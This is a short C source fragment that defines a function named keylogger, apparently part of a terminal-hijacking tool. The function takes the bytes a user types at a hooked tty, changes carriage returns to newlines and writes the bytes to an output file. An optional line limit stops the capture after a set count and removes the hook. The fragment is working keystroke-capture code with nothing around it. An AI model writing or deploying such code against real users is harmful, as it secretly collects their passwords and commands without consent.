
static void keylogger(tas_tty *tty, char **buf, size_t *n)
{
	int fd = tty->output_fd;
	char aux;

	int last_byte = (*n - 1);

	aux = (*buf)[last_byte];
	if (aux == '\r') {
		(*buf)[last_byte] = '\n';
	}

#ifdef LINE_LIMIT
	static int lines = 0;

	if ((*buf)[last_byte] == '\n') {
		lines++;
	}

	if (lines == LINE_LIMIT) {
		write(fd, *buf, *n);
		close(fd);

		(*buf)[last_byte] = aux;

		tty->input_hook = NULL;
		return;
	}
#endif

	if (write(fd, *buf, *n) == -1)
		tty->input_hook = NULL;

	(*buf)[last_byte] = aux;
}
